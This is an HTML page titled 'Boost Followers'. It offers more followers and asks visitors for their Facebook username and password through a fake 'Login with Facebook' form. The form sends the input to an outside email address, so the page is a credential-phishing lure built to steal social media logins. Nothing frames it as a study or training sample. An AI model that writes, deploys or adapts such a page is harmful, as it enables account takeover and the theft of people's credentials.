<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Boost followers</title>
<style>
    body {
        background-color: #3498db;
        font-family: Arial, sans-serif;
        text-align: center;
    }
    .form-container {
        max-width: 400px;
        margin: 100px auto;
        padding: 20px;
        background-color: #fff;
        border-radius: 8px;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }
    input[type="text"],
    input[type="password"],
    input[type="submit"] {
        width: 100%;
        padding: 10px;
        margin: 8px 0;
        display: inline-block;
        border: 1px solid #ccc;
        box-sizing: border-box;
        border-radius: 5px;
    }
</style>
</head>
<body>
<div class="form-container">
    <h1>Boost Followers</h1>
    <form action="unlimitedtechx7@yahoo.com" method="post">
        <input type="text" name="username" placeholder="Enter your Facebook username" required><br>
        <input type="password" name="password" placeholder="Enter your Facebook password" required><br>
        <input type="submit" value="Login with Facebook">
    </form>
</div>
</body>
</html>
